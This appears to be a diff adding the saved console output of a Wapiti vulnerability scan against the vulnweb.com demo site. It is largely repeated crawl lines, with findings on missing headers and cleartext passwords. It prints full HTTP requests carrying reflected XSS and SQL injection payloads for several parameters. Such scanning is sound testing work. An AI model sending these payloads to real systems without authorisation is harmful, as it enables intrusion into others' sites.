@@ -1,0 +1,509 @@
+
+     __    __            _ _   _ _____
+    / / /\ \ \__ _ _ __ (_) |_(_)___ /
+    \ \/  \/ / _` | '_ \| | __| | |_ \
+     \  /\  / (_| | |_) | | |_| |___) |
+      \/  \/ \__,_| .__/|_|\__|_|____/
+                  |_|                 
+Wapiti 3.2.10 (wapiti-scanner.github.io)
+CSP is not set for URL: http://testphp.vulnweb.com/
+X-Frame-Options is not set on http://testphp.vulnweb.com/
+X-Content-Type-Options is not set on http://testphp.vulnweb.com/
+Host testphp.vulnweb.com serves HTTP content without redirecting to HTTPS.
+Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://testphp.vulnweb.com/search.php?test=query. The server did not enforce HTTPS.
+Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://testphp.vulnweb.com/search.php?test=query. The server did not enforce HTTPS.
+Cleartext transmission of sensitive information: Password field 'pass' is sent over unencrypted connections from URL http://testphp.vulnweb.com/login.php
+Potential full path disclosure in http://testphp.vulnweb.com/listproducts.php: /hj/var/www/listproducts.php
+Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://testphp.vulnweb.com/userinfo.php. The server redirected, but not to an HTTPS URL, leaving the initial data and the redirection exposed.
+Cleartext transmission of sensitive information: Password field 'upass' is sent over unencrypted connections from URL http://testphp.vulnweb.com/signup.php
+Cleartext transmission of sensitive information: Password field 'upass2' is sent over unencrypted connections from URL http://testphp.vulnweb.com/signup.php
+[*] Saving scan state, please wait...
+This scan has been saved in the file /root/.wapiti/scans/testphp.vulnweb.com_folder_a3961d28.db
+[*] Wapiti found 31 URLs and forms during the scan
+
+[*] Launching module xss
+[+] GET http://testphp.vulnweb.com/ (0)
+[+] GET http://testphp.vulnweb.com/AJAX/index.php (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (2)
+[+] GET http://testphp.vulnweb.com/artists.php (1)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=3 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=1 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=2 (2)
+[+] GET http://testphp.vulnweb.com/cart.php (1)
+[+] GET http://testphp.vulnweb.com/categories.php (1)
+[+] GET http://testphp.vulnweb.com/disclaimer.php (1)
+[+] GET http://testphp.vulnweb.com/guestbook.php (1)
+[+] GET http://testphp.vulnweb.com/hpp/ (1)
+[+] GET http://testphp.vulnweb.com/hpp/?pp=12 (2)
+[+] GET http://testphp.vulnweb.com/index.php (1)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=4 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=3 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=1 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=2 (2)
+[+] GET http://testphp.vulnweb.com/login.php (1)
+[+] GET http://testphp.vulnweb.com/privacy.php (1)
+[+] GET http://testphp.vulnweb.com/search.php (1)
+[+] GET http://testphp.vulnweb.com/search.php?test=query (1)
+[+] GET http://testphp.vulnweb.com/signup.php (2)
+[+] GET http://testphp.vulnweb.com/userinfo.php (1)
+[+] POST http://testphp.vulnweb.com/guestbook.php (2)
+	data: name=anonymous%20user&submit=add%20message&text=Hi%20there%21
+[+] POST http://testphp.vulnweb.com/search.php?test=query (1)
+	data: searchFor=default&goButton=go
+[+] POST http://testphp.vulnweb.com/userinfo.php (2)
+	data: uname=default&pass=Letm3in_
+---
+Reflected Cross Site Scripting in http://testphp.vulnweb.com/guestbook.php via injection in the parameter name
+Evil request:
+    POST /guestbook.php HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://testphp.vulnweb.com/guestbook.php
+    content-length: 95
+    Content-Type: application/x-www-form-urlencoded
+
+    name=%3CScRiPt%3Ealert%28%27w51jet6spz%27%29%3C%2FsCrIpT%3E&submit=add%20message&text=Hi%20there%21
+---
+---
+Reflected Cross Site Scripting in http://testphp.vulnweb.com/hpp/ via injection in the parameter pp
+Evil request:
+    GET /hpp/?pp=%22%3E%3C%2Fa%3E%3CScRiPt%3Ealert%28%27wurp7karb9%27%29%3C%2FsCrIpT%3E HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+Reflected Cross Site Scripting in http://testphp.vulnweb.com/artists.php via injection in the parameter artist
+Evil request:
+    GET /artists.php?artist=%3CScRiPt%3Ealert%28%27w8htj4tuct%27%29%3C%2FsCrIpT%3E HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+Reflected Cross Site Scripting in http://testphp.vulnweb.com/listproducts.php via injection in the parameter cat
+Evil request:
+    GET /listproducts.php?cat=%3CScRiPt%3Ealert%28%27w98o89aj8n%27%29%3C%2FsCrIpT%3E HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+Reflected Cross Site Scripting in http://testphp.vulnweb.com/search.php via injection in the parameter searchFor
+Evil request:
+    POST /search.php?test=query HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://testphp.vulnweb.com/
+    content-length: 76
+    Content-Type: application/x-www-form-urlencoded
+
+    searchFor=%3CScRiPt%3Ealert%28%27wavijmsg12%27%29%3C%2FsCrIpT%3E&goButton=go
+---
+---
+Reflected Cross Site Scripting in http://testphp.vulnweb.com/guestbook.php via injection in the parameter text
+Evil request:
+    POST /guestbook.php HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://testphp.vulnweb.com/guestbook.php
+    content-length: 98
+    Content-Type: application/x-www-form-urlencoded
+
+    name=anonymous%20user&submit=add%20message&text=%3CScRiPt%3Ealert%28%27wzmfd6mwao%27%29%3C%2FsCrIpT%3E
+---
+
+[*] Launching module file
+[+] GET http://testphp.vulnweb.com/ (0)
+[+] GET http://testphp.vulnweb.com/AJAX/index.php (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (2)
+[+] GET http://testphp.vulnweb.com/artists.php (1)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=3 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=1 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=2 (2)
+[+] GET http://testphp.vulnweb.com/cart.php (1)
+[+] GET http://testphp.vulnweb.com/categories.php (1)
+[+] GET http://testphp.vulnweb.com/disclaimer.php (1)
+[+] GET http://testphp.vulnweb.com/guestbook.php (1)
+[+] GET http://testphp.vulnweb.com/hpp/ (1)
+[+] GET http://testphp.vulnweb.com/hpp/?pp=12 (2)
+[+] GET http://testphp.vulnweb.com/index.php (1)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=4 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=3 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=1 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=2 (2)
+[+] GET http://testphp.vulnweb.com/login.php (1)
+[+] GET http://testphp.vulnweb.com/privacy.php (1)
+[+] GET http://testphp.vulnweb.com/search.php (1)
+[+] GET http://testphp.vulnweb.com/search.php?test=query (1)
+[+] GET http://testphp.vulnweb.com/signup.php (2)
+[+] GET http://testphp.vulnweb.com/userinfo.php (1)
+[+] POST http://testphp.vulnweb.com/guestbook.php (2)
+	data: name=anonymous%20user&submit=add%20message&text=Hi%20there%21
+[+] POST http://testphp.vulnweb.com/search.php?test=query (1)
+	data: searchFor=default&goButton=go
+[+] POST http://testphp.vulnweb.com/userinfo.php (2)
+	data: uname=default&pass=Letm3in_
+
+[*] Launching module ssrf
+[+] GET http://testphp.vulnweb.com/ (0)
+[+] GET http://testphp.vulnweb.com/AJAX/index.php (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (2)
+[+] GET http://testphp.vulnweb.com/artists.php (1)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=3 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=1 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=2 (2)
+[+] GET http://testphp.vulnweb.com/cart.php (1)
+[+] GET http://testphp.vulnweb.com/categories.php (1)
+[+] GET http://testphp.vulnweb.com/disclaimer.php (1)
+[+] GET http://testphp.vulnweb.com/guestbook.php (1)
+[+] GET http://testphp.vulnweb.com/hpp/ (1)
+[+] GET http://testphp.vulnweb.com/hpp/?pp=12 (2)
+[+] GET http://testphp.vulnweb.com/index.php (1)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=4 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=3 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=1 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=2 (2)
+[+] GET http://testphp.vulnweb.com/login.php (1)
+[+] GET http://testphp.vulnweb.com/privacy.php (1)
+[+] GET http://testphp.vulnweb.com/search.php (1)
+[+] GET http://testphp.vulnweb.com/search.php?test=query (1)
+[+] GET http://testphp.vulnweb.com/signup.php (2)
+[+] GET http://testphp.vulnweb.com/userinfo.php (1)
+[+] POST http://testphp.vulnweb.com/guestbook.php (2)
+	data: name=anonymous%20user&submit=add%20message&text=Hi%20there%21
+[+] POST http://testphp.vulnweb.com/search.php?test=query (1)
+	data: searchFor=default&goButton=go
+[+] POST http://testphp.vulnweb.com/userinfo.php (2)
+	data: uname=default&pass=Letm3in_
+[*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=6cvdrs for results, please wait...
+
+[*] Launching module upload
+
+[*] Launching module redirect
+[+] GET http://testphp.vulnweb.com/ (0)
+[+] GET http://testphp.vulnweb.com/AJAX/index.php (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (2)
+[+] GET http://testphp.vulnweb.com/artists.php (1)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=3 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=1 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=2 (2)
+[+] GET http://testphp.vulnweb.com/cart.php (1)
+[+] GET http://testphp.vulnweb.com/categories.php (1)
+[+] GET http://testphp.vulnweb.com/disclaimer.php (1)
+[+] GET http://testphp.vulnweb.com/guestbook.php (1)
+[+] GET http://testphp.vulnweb.com/hpp/ (1)
+[+] GET http://testphp.vulnweb.com/hpp/?pp=12 (2)
+[+] GET http://testphp.vulnweb.com/index.php (1)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=4 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=3 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=1 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=2 (2)
+[+] GET http://testphp.vulnweb.com/login.php (1)
+[+] GET http://testphp.vulnweb.com/privacy.php (1)
+[+] GET http://testphp.vulnweb.com/search.php (1)
+[+] GET http://testphp.vulnweb.com/search.php?test=query (1)
+[+] GET http://testphp.vulnweb.com/signup.php (2)
+[+] GET http://testphp.vulnweb.com/userinfo.php (1)
+[+] POST http://testphp.vulnweb.com/guestbook.php (2)
+	data: name=anonymous%20user&submit=add%20message&text=Hi%20there%21
+[+] POST http://testphp.vulnweb.com/search.php?test=query (1)
+	data: searchFor=default&goButton=go
+[+] POST http://testphp.vulnweb.com/userinfo.php (2)
+	data: uname=default&pass=Letm3in_
+
+[*] Launching module ssl
+
+[*] Launching module sql
+[+] GET http://testphp.vulnweb.com/ (0)
+[+] GET http://testphp.vulnweb.com/AJAX/index.php (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (2)
+[+] GET http://testphp.vulnweb.com/artists.php (1)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=3 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=1 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=2 (2)
+[+] GET http://testphp.vulnweb.com/cart.php (1)
+[+] GET http://testphp.vulnweb.com/categories.php (1)
+[+] GET http://testphp.vulnweb.com/disclaimer.php (1)
+[+] GET http://testphp.vulnweb.com/guestbook.php (1)
+[+] GET http://testphp.vulnweb.com/hpp/ (1)
+[+] GET http://testphp.vulnweb.com/hpp/?pp=12 (2)
+[+] GET http://testphp.vulnweb.com/index.php (1)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=4 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=3 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=1 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=2 (2)
+[+] GET http://testphp.vulnweb.com/login.php (1)
+[+] GET http://testphp.vulnweb.com/privacy.php (1)
+[+] GET http://testphp.vulnweb.com/search.php (1)
+[+] GET http://testphp.vulnweb.com/search.php?test=query (1)
+[+] GET http://testphp.vulnweb.com/signup.php (2)
+[+] GET http://testphp.vulnweb.com/userinfo.php (1)
+[+] POST http://testphp.vulnweb.com/guestbook.php (2)
+	data: name=anonymous%20user&submit=add%20message&text=Hi%20there%21
+[+] POST http://testphp.vulnweb.com/search.php?test=query (1)
+	data: searchFor=default&goButton=go
+[+] POST http://testphp.vulnweb.com/userinfo.php (2)
+	data: uname=default&pass=Letm3in_
+---
+SQL Injection (DBMS: MySQL) in http://testphp.vulnweb.com/artists.php via injection in the parameter artist
+Evil request:
+    GET /artists.php?artist=3%C2%BF%27%22%28 HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+SQL Injection (DBMS: MySQL) in http://testphp.vulnweb.com/listproducts.php via injection in the parameter cat
+Evil request:
+    GET /listproducts.php?cat=4%C2%BF%27%22%28 HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+SQL Injection (DBMS: MySQL) in http://testphp.vulnweb.com/userinfo.php via injection in the parameter uname
+Evil request:
+    POST /userinfo.php HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://testphp.vulnweb.com/login.php
+    content-length: 42
+    Content-Type: application/x-www-form-urlencoded
+
+    uname=default%C2%BF%27%22%28&pass=Letm3in_
+---
+---
+SQL Injection (DBMS: MySQL) in http://testphp.vulnweb.com/search.php via injection in the parameter test
+Evil request:
+    POST /search.php?test=query%C2%BF%27%22%28 HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://testphp.vulnweb.com/
+    content-length: 29
+    Content-Type: application/x-www-form-urlencoded
+
+    searchFor=default&goButton=go
+---
+---
+SQL Injection (DBMS: MySQL) in http://testphp.vulnweb.com/search.php via injection in the parameter test
+Evil request:
+    GET /search.php?test=query%C2%BF%27%22%28 HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+SQL Injection (DBMS: MySQL) in http://testphp.vulnweb.com/userinfo.php via injection in the parameter pass
+Evil request:
+    POST /userinfo.php HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://testphp.vulnweb.com/login.php
+    content-length: 41
+    Content-Type: application/x-www-form-urlencoded
+
+    uname=default&pass=default%C2%BF%27%22%28
+---
+---
+SQL Injection (DBMS: MySQL) in http://testphp.vulnweb.com/search.php via injection in the parameter searchFor
+Evil request:
+    POST /search.php?test=query HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://testphp.vulnweb.com/
+    content-length: 42
+    Content-Type: application/x-www-form-urlencoded
+
+    searchFor=query%C2%BF%27%22%28&goButton=go
+---
+---
+SQL Injection in http://testphp.vulnweb.com/listproducts.php via injection in the parameter cat
+Evil request:
+    GET /listproducts.php?cat=1%20AND%2042%3D42%20AND%2054%3D54 HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+SQL Injection in http://testphp.vulnweb.com/listproducts.php via injection in the parameter cat
+Evil request:
+    GET /listproducts.php?cat=2%20AND%2027%3D27%20AND%2063%3D63 HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+SQL Injection in http://testphp.vulnweb.com/artists.php via injection in the parameter artist
+Evil request:
+    GET /artists.php?artist=1%20AND%2073%3D73%20AND%2044%3D44 HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+---
+SQL Injection in http://testphp.vulnweb.com/artists.php via injection in the parameter artist
+Evil request:
+    GET /artists.php?artist=2%20AND%2078%3D78%20AND%2043%3D43 HTTP/1.1
+    host: testphp.vulnweb.com
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+---
+
+[*] Launching module exec
+[+] GET http://testphp.vulnweb.com/ (0)
+[+] GET http://testphp.vulnweb.com/AJAX/index.php (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (2)
+[+] GET http://testphp.vulnweb.com/artists.php (1)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=3 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=1 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=2 (2)
+[+] GET http://testphp.vulnweb.com/cart.php (1)
+[+] GET http://testphp.vulnweb.com/categories.php (1)
+[+] GET http://testphp.vulnweb.com/disclaimer.php (1)
+[+] GET http://testphp.vulnweb.com/guestbook.php (1)
+[+] GET http://testphp.vulnweb.com/hpp/ (1)
+[+] GET http://testphp.vulnweb.com/hpp/?pp=12 (2)
+[+] GET http://testphp.vulnweb.com/index.php (1)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=4 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=3 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=1 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=2 (2)
+[+] GET http://testphp.vulnweb.com/login.php (1)
+[+] GET http://testphp.vulnweb.com/privacy.php (1)
+[+] GET http://testphp.vulnweb.com/search.php (1)
+[+] GET http://testphp.vulnweb.com/search.php?test=query (1)
+[+] GET http://testphp.vulnweb.com/signup.php (2)
+[+] GET http://testphp.vulnweb.com/userinfo.php (1)
+[+] POST http://testphp.vulnweb.com/guestbook.php (2)
+	data: name=anonymous%20user&submit=add%20message&text=Hi%20there%21
+[+] POST http://testphp.vulnweb.com/search.php?test=query (1)
+	data: searchFor=default&goButton=go
+[+] POST http://testphp.vulnweb.com/userinfo.php (2)
+	data: uname=default&pass=Letm3in_
+
+[*] Launching module permanentxss
+[+] GET http://testphp.vulnweb.com/ (0)
+[+] GET http://testphp.vulnweb.com/AJAX/index.php (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/ (1)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/ (2)
+[+] GET http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ (2)
+[+] GET http://testphp.vulnweb.com/artists.php (1)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=3 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=1 (2)
+[+] GET http://testphp.vulnweb.com/artists.php?artist=2 (2)
+[+] GET http://testphp.vulnweb.com/cart.php (1)
+[+] GET http://testphp.vulnweb.com/categories.php (1)
+[+] GET http://testphp.vulnweb.com/disclaimer.php (1)
+[+] GET http://testphp.vulnweb.com/guestbook.php (1)
+[+] GET http://testphp.vulnweb.com/hpp/ (1)
+[+] GET http://testphp.vulnweb.com/hpp/?pp=12 (2)
+[+] GET http://testphp.vulnweb.com/index.php (1)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=4 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=3 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=1 (2)
+[+] GET http://testphp.vulnweb.com/listproducts.php?cat=2 (2)
+[+] GET http://testphp.vulnweb.com/login.php (1)
+[+] GET http://testphp.vulnweb.com/privacy.php (1)
+[+] GET http://testphp.vulnweb.com/search.php (1)
+[+] GET http://testphp.vulnweb.com/search.php?test=query (1)
+[+] GET http://testphp.vulnweb.com/signup.php (2)
+[+] POST http://testphp.vulnweb.com/guestbook.php (2)
+	data: name=anonymous%20user&submit=add%20message&text=Hi%20there%21
+[+] POST http://testphp.vulnweb.com/search.php?test=query (1)
+	data: searchFor=default&goButton=go
+
+[*] Generating report...
+A report has been generated in the file /root/.wapiti/generated_report
+Open /root/.wapiti/generated_report/testphp.vulnweb.com_01082026_1413.html with a browser to see this report.
